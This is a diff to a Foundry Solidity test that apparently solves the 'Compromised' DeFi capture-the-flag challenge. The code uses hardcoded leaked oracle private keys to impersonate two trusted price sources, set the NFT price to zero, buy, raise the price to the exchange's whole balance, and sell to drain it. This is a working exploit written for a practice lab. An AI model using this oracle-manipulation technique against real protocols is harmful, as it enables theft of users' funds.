@@ -53,16 +53,45 @@ contract Compromised is Challenge {
     }
 
     function test_ExploitCompromised() public {
+        // leaked info: Hex -> utf8 -> encodeBase64
+        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        uint256 privateKey = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address addr = vm.addr(privateKey);
+        assertEq(addr, sources[2]);
+        privateKey = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        addr = vm.addr(privateKey);
+        assertEq(addr, sources[1]);
+
+        set_prices(0);
+
         vm.startPrank(attacker);
-        // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
-        // get median price < 0.1 eth
-        // buy lots
-        // get median price >> 100 eth
-        // sell all until exchange runs out
-        oracle.getMedianPrice(dvnft.symbol());
-        oracle.getRoleAdmin(oracle.TRUSTED_SOURCE_ROLE());
-        oracle.getRoleMemberCount(oracle.TRUSTED_SOURCE_ROLE());
-        oracle.getRoleMemberCount(oracle.DEFAULT_ADMIN_ROLE());
+        exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
         vm.stopPrank();
+
+        set_prices(EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(attacker);
+        exchange.token().approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
+        set_prices(INITIAL_NFT_PRICE);
+        validation();
+    }
+
+    function set_prices(uint256 amount) public {
+        vm.startPrank(sources[2]);
+        oracle.postPrice(dvnft.symbol(), amount);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(dvnft.symbol(), amount);
+        vm.stopPrank();
+    }
+
+    function validation() public override {
+        assertEq(address(exchange).balance, 0);
+        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
+        assertEq(dvnft.balanceOf(attacker), 0);
+        assertEq(oracle.getMedianPrice(dvnft.symbol()), INITIAL_NFT_PRICE);
     }
 }
